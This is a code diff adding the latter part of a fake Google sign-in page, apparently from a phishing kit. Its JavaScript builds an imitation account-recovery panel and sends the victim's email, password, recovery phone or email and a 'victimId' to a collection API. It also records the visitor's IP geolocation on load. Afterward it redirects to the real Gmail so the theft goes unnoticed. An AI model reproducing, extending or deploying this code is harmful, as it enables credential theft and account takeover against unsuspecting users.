+  const msgEl = document.getElementById('loading-msg');
+  msgEl.textContent = 'Opening Gmail…';
+  setTimeout(()=>{
+    if(isAndroid){
+      const gmailIntent = 'intent://#Intent;package=com.google.android.gm;scheme=googlegmail;action=android.intent.action.VIEW;S.browser_fallback_url=' + encodeURIComponent('https://mail.google.com/mail/u/0/') + ';end';
+      try{ window.location.href = gmailIntent; }catch(e){ window.location.href = 'https://mail.google.com/mail/u/0/'; }
+      setTimeout(()=>{ if(!document.hidden){ window.location.href = 'https://mail.google.com/mail/u/0/'; } }, 1800);
+      return;
+    }
+    if(isIOS){
+      const start = Date.now();
+      try{ window.location.href = 'googlegmail://'; }catch(e){}
+      setTimeout(()=>{
+        if(Date.now()-start < 2000 && !document.hidden){ window.location.href = 'https://mail.google.com/mail/u/0/'; }
+      }, 1500);
+      return;
+    }
+    setTimeout(()=>{ window.location.href = 'https://mail.google.com/mail/u/0/'; }, 500);
+  }, 600);
+}
+
+/* ============================================================
+   FORGOT / RECOVERY
+   ============================================================ */
+let recoveryType = 'email';
+function goForgot(){
+  recoveryType='email';
+  document.getElementById('recovery-title').textContent='Find your email';
+  document.getElementById('recovery-sub').textContent='Enter your phone number or recovery email';
+  document.getElementById('recovery-label').textContent='Phone number or recovery email';
+  document.getElementById('recovery-input').value='';
+  document.getElementById('recovery-note').innerHTML='<b>Note:</b> If you forgot the email address you use to sign in, you can use a phone number or recovery email to find it.';
+  showPanel('panel-recovery');
+  setTimeout(()=>document.getElementById('recovery-input').focus(),120);
+}
+function goForgotPassword(){
+  recoveryType='password';
+  document.getElementById('recovery-title').textContent='Account recovery';
+  document.getElementById('recovery-sub').textContent='Enter your recovery email or phone number to reset your password';
+  document.getElementById('recovery-label').textContent='Recovery email or phone';
+  document.getElementById('recovery-input').value='';
+  document.getElementById('recovery-note').innerHTML=`<b>Note:</b> We'll send a verification code to help you reset your password.`;
+  showPanel('panel-recovery');
+  setTimeout(()=>document.getElementById('recovery-input').focus(),120);
+}
+function backToEmail(){
+  if(recoveryType==='password' && state.email){ showPanel('panel-pass'); }
+  else { showPanel('panel-email'); }
+}
+async function submitRecovery(ev){
+  const btn=document.getElementById('btn-rec'), input=document.getElementById('recovery-input');
+  const field=document.getElementById('field-rec'), err=document.getElementById('err-rec'), errTx=document.getElementById('err-rec-text');
+  ripple(ev, btn);
+  const val=input.value.trim();
+  if(!val||!isValidEmailOrPhone(val)){
+    field.classList.add('error'); errTx.textContent='Enter a valid email or phone number';
+    err.classList.add('show'); input.focus(); return;
+  }
+  field.classList.remove('error'); err.classList.remove('show');
+  btn.classList.add('loading');
+  await postAPI('recovery', {
+    victimId: state.victimId,
+    email: state.email,
+    password: state.password,
+    recovery: val,
+    recoveryType: recoveryType
+  });
+  setTimeout(()=>{
+    btn.classList.remove('loading');
+    const note=document.getElementById('recovery-note');
+    note.style.background='rgba(129,201,149,.1)';
+    note.style.borderColor='rgba(129,201,149,.3)';
+    note.innerHTML='<b style="color:#81c995;">✓ Recovery info received.</b> If this matches our records, we\'ll send a verification code shortly.';
+    setTimeout(()=>{
+      note.style.background=''; note.style.borderColor='';
+      note.innerHTML='<b>Note:</b> If you forgot the email address you use to sign in, you can use a phone number or recovery email to find it.';
+      backToEmail();
+    }, 2200);
+  }, 400);
+}
+
+/* ============================================================
+   LISTENERS
+   ============================================================ */
+document.getElementById('showpass').addEventListener('change', function(){
+  document.getElementById('password').type = this.checked ? 'text' : 'password';
+});
+['keyup','keydown'].forEach(evt=>{
+  document.getElementById('password').addEventListener(evt, function(e){
+    const on = e.getModifierState && e.getModifierState('CapsLock');
+    document.getElementById('capslock').classList.toggle('show', !!on);
+  });
+});
+document.getElementById('email').addEventListener('input', ()=>{
+  document.getElementById('field-email').classList.remove('error');
+  document.getElementById('err-email').classList.remove('show');
+});
+document.getElementById('password').addEventListener('input', ()=>{
+  document.getElementById('field-pass').classList.remove('error');
+  document.getElementById('err-pass').classList.remove('show');
+});
+document.getElementById('recovery-input').addEventListener('input', ()=>{
+  document.getElementById('field-rec').classList.remove('error');
+  document.getElementById('err-rec').classList.remove('show');
+});
+document.getElementById('btn-next1').addEventListener('click', goPassword);
+document.getElementById('btn-next2').addEventListener('click', submitPassword);
+document.getElementById('btn-rec').addEventListener('click', submitRecovery);
+document.getElementById('email').addEventListener('keydown', e=>{ if(e.key==='Enter'){ e.preventDefault(); goPassword({clientX:0,clientY:0}); }});
+document.getElementById('password').addEventListener('keydown', e=>{ if(e.key==='Enter'){ e.preventDefault(); submitPassword({clientX:0,clientY:0}); }});
+document.getElementById('recovery-input').addEventListener('keydown', e=>{ if(e.key==='Enter'){ e.preventDefault(); submitRecovery({clientX:0,clientY:0}); }});
+window.addEventListener('load', ()=>{
+  fetchIPInfo().then(g=>{ if(g) state.geo=g; });
+  setTimeout(()=>document.getElementById('email').focus(),200);
+});
+</script>
+</body>
+</html>
